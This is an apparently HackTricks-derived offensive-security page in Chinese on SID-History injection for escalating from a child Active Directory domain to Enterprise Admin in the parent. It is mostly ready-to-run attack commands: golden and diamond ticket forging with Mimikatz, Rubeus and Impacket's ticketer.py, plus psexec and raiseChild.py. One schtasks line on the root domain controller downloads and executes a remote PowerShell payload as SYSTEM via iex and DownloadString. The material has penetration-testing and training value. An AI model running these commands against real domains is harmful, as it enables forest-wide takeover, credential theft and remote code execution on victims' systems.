# SID-History 注入

{{#include ../../banners/hacktricks-training.md}}

## SID 历史注入攻击

**SID 历史注入攻击**的重点是帮助**用户在域之间迁移**，同时确保继续访问前一个域的资源。这是通过**将用户之前的安全标识符 (SID) 纳入其新账户的 SID 历史**来实现的。值得注意的是，这一过程可以被操控，通过将来自父域的高权限组（如企业管理员或域管理员）的 SID 添加到 SID 历史中，从而授予未经授权的访问权限。这种利用方式使得可以访问父域内的所有资源。

执行此攻击有两种方法：通过创建**金票**或**钻石票**。

要确定**“企业管理员”**组的 SID，首先必须找到根域的 SID。在识别后，可以通过将 `-519` 附加到根域的 SID 来构建企业管理员组的 SID。例如，如果根域 SID 为 `S-1-5-21-280534878-1496970234-700767426`，则“企业管理员”组的 SID 将为 `S-1-5-21-280534878-1496970234-700767426-519`。

您还可以使用**域管理员**组，其 SID 以**512**结尾。

找到其他域（例如“域管理员”）组的 SID 的另一种方法是：
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### Golden Ticket (Mimikatz) 与 KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
有关 golden tickets 的更多信息，请查看：

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket (Rubeus + KRBTGT-AES256)
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
有关 diamond tickets 的更多信息，请查看：

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
使用被攻陷域的 KRBTGT 哈希提升到根或企业管理员的 DA：
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
通过攻击获得的权限，您可以在新域中执行例如 DCSync 攻击：

{{#ref}}
dcsync.md
{{#endref}}

### 从 Linux

#### 使用 [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) 手动执行
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### 自动使用 [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

这是一个 Impacket 脚本，它将 **自动化从子域提升到父域**。该脚本需要：

- 目标域控制器
- 子域中管理员用户的凭据

流程如下：

- 获取父域的企业管理员组的 SID
- 检索子域中 KRBTGT 账户的哈希
- 创建一个黄金票证
- 登录到父域
- 检索父域中管理员账户的凭据
- 如果指定了 `target-exec` 开关，它将通过 Psexec 认证到父域的域控制器。
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## 参考

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
